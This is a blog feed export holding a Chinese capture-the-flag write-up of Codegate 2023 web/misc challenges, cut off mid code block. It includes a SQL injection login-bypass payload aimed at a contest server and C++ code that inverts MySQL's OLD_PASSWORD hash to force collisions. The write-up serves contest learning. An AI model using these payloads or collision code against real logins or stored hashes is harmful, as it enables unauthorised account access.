{
    "version": "https://jsonfeed.org/version/1",
    "title": "Cubic Y³ • All posts by \"write-up\" tag",
    "description": "CTF, life, waifus, and thoughts.",
    "home_page_url": "http://cubicy.icu",
    "items": [
        {
            "id": "http://cubicy.icu/2023/08/29/CODEGATE%202023%20Write-Up%20(web)/",
            "url": "http://cubicy.icu/2023/08/29/CODEGATE%202023%20Write-Up%20(web)/",
            "title": "Codegate 2023 Partial Write-Up (Web/Misc)",
            "date_published": "2023-08-29T07:05:06.000Z",
            "content_html": "<h1 id=\"Codegate-2023-部分Write-Up-Web-x2F-Misc\"><a href=\"#Codegate-2023-部分Write-Up-Web-x2F-Misc\" class=\"headerlink\" title=\"Codegate 2023 部分Write-Up (Web&#x2F;Misc)\"></a>Codegate 2023 部分Write-Up (Web&#x2F;Misc)</h1><p>这次去韩国参加了Codegate 2023的决赛！把Web部分的题解在此释出，其他游记&#x2F;照片另开一文。  </p>\n<h2 id=\"Warmup\"><a href=\"#Warmup\" class=\"headerlink\" title=\"Warmup\"></a>Warmup</h2><p>没咋看。似乎是XSS绕绕。</p>\n<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><p>是的，这题就叫Pwn（与之相对的是Pwn分类里有道题叫Web）<br>解法：没咋看。应该是比较水的一题。经典数组绕过  </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data = <span class=\"string\">&quot;username[0]=\\\\&#x27; union select password from USER WHERE username=&#x27;admin&#x27; -- &amp;username[1]=2&amp;password=3&quot;</span></span><br><span class=\"line\">r = requests.post(<span class=\"string\">&quot;http://3.35.198.7:2929/login&quot;</span>, data=data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Cha’s-magic\"><a href=\"#Cha’s-magic\" class=\"headerlink\" title=\"Cha’s magic\"></a>Cha’s magic</h2><p>源码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">require_once <span class=\"string\">&#x27;config.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">function hashPasswordOld($password_to_hash)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $host, $dbname, $username, $password, $charset;</span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $db = new PDO(<span class=\"string\">&quot;mysql:host=$host;dbname=$dbname;charset=$charset&quot;</span>, $username, $password);</span><br><span class=\"line\"></span><br><span class=\"line\">        $query = $db-&gt;prepare(<span class=\"string\">&quot;SELECT OLD_PASSWORD(:password)&quot;</span>);</span><br><span class=\"line\">        $query-&gt;execute([<span class=\"string\">&#x27;:password&#x27;</span> =&gt; $password_to_hash]);</span><br><span class=\"line\"></span><br><span class=\"line\">        $row = $query-&gt;fetch(PDO::FETCH_NUM);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($row)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> $row[<span class=\"number\">0</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    catch(PDOException $ex)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;An Error occured!&lt;br&gt;&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> null;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(isset($_GET[<span class=\"string\">&quot;v1&quot;</span>]) &amp;&amp; isset($_GET[<span class=\"string\">&quot;v2&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $v1 = $_GET[<span class=\"string\">&quot;v1&quot;</span>];</span><br><span class=\"line\">    $v2 = $_GET[<span class=\"string\">&quot;v2&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (substr($v1, <span class=\"number\">0</span>, <span class=\"number\">13</span>) !== <span class=\"string\">&quot;codegate2023&#123;&quot;</span> || substr($v1, -<span class=\"number\">11</span>) !== <span class=\"string\">&quot;i_love_you&#125;&quot;</span> ||</span><br><span class=\"line\">        substr($v2, <span class=\"number\">0</span>, <span class=\"number\">13</span>) !== <span class=\"string\">&quot;codegate2023&#123;&quot;</span> || substr($v2, -<span class=\"number\">11</span>) !== <span class=\"string\">&quot;i_love_you&#125;&quot;</span>) &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;fall in love~&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v1 == $v2) die(<span class=\"string\">&quot;are you kidding me?&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $v1 = hashPasswordOld($v1);</span><br><span class=\"line\">    $v2 = hashPasswordOld($v2);</span><br><span class=\"line\">    $v3 = hashPasswordOld($flag);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v3 !== <span class=\"string\">&quot;6368616368613230&quot;</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;flag verification failed.&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v1 == null <span class=\"keyword\">or</span> $v2 == null)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;What the hell here?&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v1 == $v2)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($v2 == $v3)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            die($flag);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        die(substr($flag, <span class=\"number\">0</span>, strlen($flag) / <span class=\"number\">2</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    die(<span class=\"string\">&quot;Try harder...&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>也就是v1和v2和v3经过hash得到的值都一样才能拿到完整flag。<br>对于OLD_PASSWORD的算法，网上有很多实现，这里有一个C#版本的：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Online C# Editor for free</span></span><br><span class=\"line\"><span class=\"comment\">// Write, Edit and Run your C# code using C# Online Compiler</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">HelloWorld</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"built_in\">string</span> <span class=\"title\">mysql_old_password</span>(<span class=\"params\"><span class=\"built_in\">string</span> sPassword</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    UInt32[] result = <span class=\"keyword\">new</span> UInt32[<span class=\"number\">2</span>];</span><br><span class=\"line\">    <span class=\"built_in\">bool</span> bDebug = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    UInt32 nr = (UInt32)<span class=\"number\">1345345333</span>, <span class=\"keyword\">add</span> = (UInt32)<span class=\"number\">7</span>, nr2 = (UInt32)<span class=\"number\">0x12345671</span>;</span><br><span class=\"line\">    UInt32 tmp;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">char</span> [] password = sPassword.ToCharArray();</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; sPassword.Length; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (password[i] == <span class=\"string\">&#x27; &#x27;</span> || password[i] == <span class=\"string\">&#x27;\\t&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp = (UInt32)password[i];</span><br><span class=\"line\">        nr ^= (((nr &amp; <span class=\"number\">63</span>) + <span class=\"keyword\">add</span>) * tmp) + (nr &lt;&lt; <span class=\"number\">8</span>);</span><br><span class=\"line\">        nr2 += (nr2 &lt;&lt; <span class=\"number\">8</span> ) ^ nr;</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;---&quot;</span>);</span><br><span class=\"line\">        Console.WriteLine(nr.ToString(<span class=\"string\">&quot;X&quot;</span>));</span><br><span class=\"line\">        Console.WriteLine(nr2.ToString(<span class=\"string\">&quot;X&quot;</span>));</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;---&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">add</span> += tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    UInt32 mask = (((UInt32)<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">31</span>) - (UInt32)<span class=\"number\">1</span>); <span class=\"comment\">// 111....11, 31bits</span></span><br><span class=\"line\">    result[<span class=\"number\">0</span>] = nr &amp; mask;</span><br><span class=\"line\">    result[<span class=\"number\">1</span>] = nr2 &amp; mask;</span><br><span class=\"line\">    <span class=\"built_in\">string</span> hash = String.Format(<span class=\"string\">&quot;&#123;0:X&#125;&#123;1:X&#125;&quot;</span>, result[<span class=\"number\">0</span>], result[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hash.ToLower();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"built_in\">string</span>[] args</span>)</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Console.WriteLine (mysql_old_password(<span class=\"string\">&quot;aaaaa&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到，v1和v2的hash值碰撞只需要加入空格就可以：因为该算法完全忽略空格和制表符。<br>这样前一半flag就知道了：<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP</code><br>核心问题在于使v2的hash值等于<code>6368616368613230</code>，v2必须以<code>i_love_you&#125;</code>结尾，我们唯一能改变的就是中间的字符串。<br>经过搜寻，找到一个帖子：<a href=\"https://security.stackexchange.com/questions/3133/mysql-old-password-cryptanalysis\">mysql-old-password-cryptanalysis</a><br>里面给出了一段逆向推导nr与nr2的代码，以及一篇分析该算法的论文：F. Muller and T. Peyrin “Cryptanalysis of T-Function-Based Hash Functions” in International Conference on Information Security and Cryptology - ICISC 2006<br>不过需要注意的是该论文中的算法和实际算法有一个微小差异：nr2对应公式的<code>=</code>应为<code>+=</code>。<br>逆向计算nr&#x2F;nr2：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">pre</span><span class=\"params\">(<span class=\"type\">int</span> level = <span class=\"number\">0</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; level; i++)</span><br><span class=\"line\">        cout &lt;&lt; <span class=\"string\">&quot;-&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">bruteforce</span><span class=\"params\">(<span class=\"type\">uint32_t</span> pnr, <span class=\"type\">uint32_t</span> pnr2, <span class=\"type\">uint32_t</span> add, <span class=\"type\">unsigned</span> len, <span class=\"comment\">/*debug only!*/</span> <span class=\"type\">unsigned</span> level = <span class=\"number\">0</span>)</span></span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> charset[] = <span class=\"string\">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;</span>; <span class=\"comment\">// sorted by ascii</span></span><br><span class=\"line\"><span class=\"comment\">//这里的代码假设只有以上字符存在，事实上完全没有必要：ascii 32-127都可以。</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">oldpw_rev</span><span class=\"params\">(<span class=\"type\">uint32_t</span> pnr, <span class=\"type\">uint32_t</span> pnr2, <span class=\"type\">uint32_t</span> add,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">              <span class=\"type\">unsigned</span> <span class=\"type\">char</span> c, <span class=\"type\">unsigned</span> len, <span class=\"comment\">/*debug only!*/</span> <span class=\"type\">unsigned</span> level = <span class=\"number\">0</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nr, nr2;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> u, e, y;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (len == <span class=\"number\">0</span> &amp;&amp; add==<span class=\"number\">7</span> &amp;&amp; pnr2==<span class=\"number\">0x12345671</span>) <span class=\"comment\">// Modify to target value when MiM-ing</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    nr = pnr;</span><br><span class=\"line\">    nr2 = pnr2;</span><br><span class=\"line\">    <span class=\"comment\">// c = cc[len - 1];</span></span><br><span class=\"line\">    add -= c;</span><br><span class=\"line\"></span><br><span class=\"line\">    u = nr2 - nr;</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    y = nr;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (e = <span class=\"number\">0</span>; e &lt; <span class=\"number\">64</span>; e++)</span><br><span class=\"line\">    &#123; <span class=\"comment\">// guess 6 lsb of nr</span></span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> z, g;</span><br><span class=\"line\"></span><br><span class=\"line\">        z = (e + add) * c;</span><br><span class=\"line\">        g = (e ^ z) &amp; <span class=\"number\">0x3F</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (g == (y &amp; <span class=\"number\">0x3F</span>))</span><br><span class=\"line\">        &#123; <span class=\"comment\">// must matches, otherwise reject it</span></span><br><span class=\"line\">            <span class=\"type\">uint32_t</span> x;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Now 8 LSB of nr known, byte-by-byte derive previous nr</span></span><br><span class=\"line\">            x = e;</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">bruteforce</span>(nr, nr2, add, len - <span class=\"number\">1</span>, level + <span class=\"number\">1</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                cout&lt;&lt;<span class=\"string\">&quot;assume:&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">bruteforce</span><span class=\"params\">(<span class=\"type\">uint32_t</span> pnr, <span class=\"type\">uint32_t</span> pnr2, <span class=\"type\">uint32_t</span> add, <span class=\"type\">unsigned</span> len, <span class=\"comment\">/*debug only!*/</span> <span class=\"type\">unsigned</span> level)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (add<span class=\"number\">-7</span>&lt;<span class=\"number\">48</span>*len||add<span class=\"number\">-7</span>&gt;<span class=\"number\">122</span>*len) <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> _=<span class=\"number\">0</span>;_&lt;<span class=\"number\">63</span>;_++) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Maybe剪枝here</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">oldpw_rev</span>(pnr,pnr2,add,charset[_],len,level)==<span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">pre</span>(level);</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;nr:%x   nr2:%x\\n&quot;</span>, pnr, pnr2);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//eg: aaaa</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> pnr = <span class=\"number\">0xA8D6917A</span>, pnr2 = <span class=\"number\">0x6FAB63E5</span>; <span class=\"comment\">//最终的nr, nr2，来自上文的C#代码</span></span><br><span class=\"line\">    cout &lt;&lt; <span class=\"built_in\">bruteforce</span>(pnr, pnr2, <span class=\"number\">97</span>*<span class=\"number\">4</span> + <span class=\"number\">7</span> <span class=\"comment\">/*add*/</span>, <span class=\"number\">4</span><span class=\"comment\">/*length*/</span>) &lt;&lt; endl; <span class=\"comment\">// ! initial value of add is 7</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>也就是，在已知add值（字符串的前缀ASCII和）以及当前字符的情况下，对于平凡情况（无多解），能在常数时间确定上一个nr&#x2F;nr2对的值。<br>一个朴素的思路是暴力枚举当前位的字符与add值。<br>暴力计算的话时间复杂度肯定是无法接受的（O(64^n)，5步需要约1分钟）。我们理一下现在已知什么，需要求解什么。请注意：我们需要的只是hash碰撞，不代表flag也是以<code>i_love_you&#125;</code>结尾的。</p>\n<ul>\n<li>v2的形式：<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&lt;???&gt;i_love_you&#125;</code></li>\n<li>FLAG的总长度为78-79（因为前一半flag长为39）</li>\n<li>最终hash(v2)&#x3D;<code>6368616368613230</code> -&gt; 最终的nr&#x2F;nr2</li>\n<li>前一半flag的add值为3430：<code>sum([ord(i) for i in &quot;codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&quot;])</code></li>\n<li>结尾的11个字符<code>i_love_you&#125;</code>对应add值：1207</li>\n<li>未知：整个flag字符串的add值<ul>\n<li>但add值的可能范围很有限，我们可以容易计算出上下界：下界为3430+39*32&#x3D;4678，上界为3430+40*127&#x3D;8510</li>\n<li><strong>并且，这个范围内合法的add值占比并不高：对于一个可能的add值，往回推结尾的那11个字符<code>i_love_you&#125;</code>必须都有解</strong></li>\n</ul>\n</li>\n</ul>\n<p>所以我们只需要MitM，中间相遇，即可爆出正解。<br>这个中间状态指的是<code>&lt;???&gt;</code>这串未知字串中间某个位置一个独特的nr&#x2F;nr2&#x2F;add对；而这个add值毕竟只是一个中间量（<strong>下称fadd</strong>），可以手动给予一个值。在本题中我们手动要求从<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&lt;???&gt;i_love_you&#125;</code>再向前填充总计<code>6*127</code>的字符作为中间相遇处：当然越大的值搜索空间越大。  </p>\n<ol>\n<li>我们先筛选出可行的add值，并记录在处理<code>i_love_you&#125;</code>前的中间add值</li>\n<li>逆向: 对于每个中间add值先逆推5步，记录所有可能在中间相遇处add值为fadd的nr&#x2F;nr2对，以及逆向对应的5个字符</li>\n<li>正向: 我们手动要求向前数步（至少6步，因为fadd值是3430+6*127）到达中间相遇处使得add值为fadd，并检查这个nr&#x2F;nr2对是否出现在逆向得到的结果中；如果有，则拿下。<br>爆破代码：Credit to @4qwerty<br>为什么for嵌套这么多？因为4老师懒得写递归，反正没几步，不够就加一层for就行了。<br>其实如果要计算的话是可以的：逆着5步大约有<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span 